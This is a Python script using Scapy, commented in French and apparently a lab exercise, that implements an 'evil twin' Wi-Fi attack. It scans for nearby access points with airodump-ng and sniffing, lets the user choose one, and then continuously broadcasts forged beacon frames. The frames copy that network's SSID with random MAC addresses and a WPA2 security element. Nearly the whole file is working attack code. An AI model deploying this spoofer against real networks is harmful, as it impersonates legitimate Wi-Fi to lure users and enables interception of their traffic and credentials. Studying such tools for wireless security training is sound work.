#!/usr/bin/env python3 
# TODO : J'arrive toujours pas a kill le processus avec une interruption..
# TODO : Spoofer avec l'adresse MAC AUSSI de l'AP ????

import argparse

from faker import Faker
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Elt, Dot11Beacon, sendp

################## Passing arguments ##################
parser = argparse.ArgumentParser(prog="Scapy fake evil tween attack",
                                 usage="%(prog)s -i wlan0mon",
                                 description="Scapy bases fake evil tween attack",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="the interface we want to sniff to be on, needs to be set to monitor mode with channel hopping")

parser.add_argument("-t", "--Timeout", required=False,
                    help="The time in secondes how long we will scan for AP, default is 15", default=15)                 


args = parser.parse_args()

####################################
################## variables ##################

IFACE_NAME = args.Interface
BROADCAST = "ff:ff:ff:ff:ff:ff"
timeout = args.Timeout
check_list = []
ap_list = []

#Classe représentant un AP
class AP:
    def __init__(self, BSSID, power, SSID, channel):
        self.BSSID = BSSID
        self.power = power
        self.SSID = SSID
        self.channel = channel

# Si jamais l'interface est down
os.system("ifconfig %s up" % IFACE_NAME)
#Launch airodump-ng en background / screen permet de ne pas afficher sur la console le process passé en argument
#Pour le scan on se met en channel hopping afin d'en trouver un maximum.
p = subprocess.Popen(['screen','-d','-m','airodump-ng',IFACE_NAME])

####################################
################## fonctions ##################

def PacketHandler(pkt):
    # On veut un Beacon de type Probe Request 
    if pkt.haslayer(Dot11Beacon):

            #Verification de doublon
            if pkt.addr2 not in check_list: 
                check_list.append(pkt.addr2)

                # On crée notre AP avec toutes les informations nécessaires
                BSSID = pkt.addr3
                SSID = pkt.info.decode("utf-8")
                channel = pkt.channel
                power = pkt[0][RadioTap].Channel

                #On met l'AP dans le tableau
                ap_list.append(AP(BSSID ,power,SSID ,channel))

def evil_tween(ssid):
    faker = Faker()

    #Préparation de la frame à envoyer#
    #envoi de la frame en broadcast, la MAC src et la MAC de l'AP sont les mêmes et valeurs bidons
    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=faker.mac_address(), addr3=faker.mac_address()) 
    #Permet à l'AP d'apparaître comme sécurisé
    beacon = Dot11Beacon(cap='ESS+privacy')
    #SSID de l'AP à spoof
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))

    #We need to add a Robust Secure Network (RSN) Information Element (IE) to our management frame.
    rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'              #RSN Version 1
    '\x00\x0f\xac\x02'      #Group Cipher Suite : 00-0f-ac TKIP
    '\x02\x00'              #2 Pairwise Cipher Suites (next two lines)
    '\x00\x0f\xac\x04'      #AES Cipher
    '\x00\x0f\xac\x02'      #TKIP Cipher
    '\x01\x00'              #1 Authentication Key Managment Suite (line below)
    '\x00\x0f\xac\x02'      #Pre-Shared Key
    '\x00\x00'))            #RSN Capabilities (no extra capabilities)

    #build de la frame
    frame = RadioTap()/dot11/beacon/essid/rsn

    #Affichage de la frame
    frame.show()
    print("\nHexDump of frame:")
    hexdump(frame)

    #envoi de la frame en continu toutes les 0.1 secondes depuis l'interface IFACE_NAME
    sendp(frame, iface=IFACE_NAME, inter=0.100, loop=1) 

####################################
################## main ##################

#Représente le temps pendant lequel les paquets seront sniffés
print("Looking for APs - %s s" % timeout)

#Sniff les paquets pour détecter les APs à proximité
sniff(iface=IFACE_NAME, prn=PacketHandler, timeout=timeout)
print("Liste des APs trouvés")

#Affiche la liste des APs trouvés
count = 0
for ap in ap_list:
    print("%s: \t MAC: %s \t FREQUENCY: %s \t CHANNEL: %s \t SSID: %s" % (count, ap.BSSID, ap.power, ap.channel, ap.SSID))
    count += 1

#Kill airodump, on le relancer plus bas sur le bon channel de l'AP a spoof
p.kill()

choice = int(input("Veuillez choisir un AP à spoof:"))
chan = ap_list[choice].channel

#On ajoute 6 channels au channel de l'AP sélectionné
if chan <= 6:
    beacon_channel = chan + 6
else:
    beacon_channel = chan - 6

#lance airodump sur le bon channel
p = subprocess.Popen(['screen','-d','-m','airodump-ng','--channel', str(beacon_channel), IFACE_NAME])

#Lancer le evil tween avec le SSID choisi par l'utilisateur
evil_tween(ap_list[choice].SSID)

#kill le subprocess
p.kill()